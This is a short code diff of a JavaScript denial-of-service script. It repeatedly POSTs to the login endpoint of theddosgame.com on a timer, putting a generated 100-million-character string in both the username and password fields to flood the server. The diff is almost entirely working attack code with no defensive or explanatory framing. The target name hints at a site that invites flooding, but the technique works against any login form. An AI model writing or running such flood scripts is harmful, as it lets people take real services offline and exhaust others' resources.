@@ -17,24 +17,17 @@ function makeid(length) {
     }
     return result;
     }
+
+let vvz = makeid(100000000)
 setInterval(()=>{
   
 
 
-function makeid(length) {
-    var result           = '';
-    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-    var charactersLength = characters.length;
-    for ( var i = 0; i < length; i++ ) {
-      result += characters.charAt(Math.floor(Math.random() * 
- charactersLength));
-   }
-   return result;
-}
+  
 fetch("https://theddosgame.com/authenticate.php", {
     "credentials": "include",
     "headers": {
-        "User-Agent": makeid(100000),
+        "User-Agent": "sudfhdsjcnkxz",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
         "Accept-Language": "en-US,en;q=0.5",
         "Content-Type": "application/x-www-form-urlencoded",
@@ -46,9 +39,11 @@ fetch("https://theddosgame.com/authenticate.php", {
         "Sec-Fetch-User": "?1"
     },
     "referrer": "https://theddosgame.com/",
-    "body": "username="+makeid(500000)+"&pass="+makeid(500000)+"&login=",
+    "body": "username="+vvz+"&pass="+vvz+"&login=",
     "method": "POST",
     "mode": "cors"
+}).then(e=>{
+    e.text().then(e=>{console.log(e)})
 })
 
 
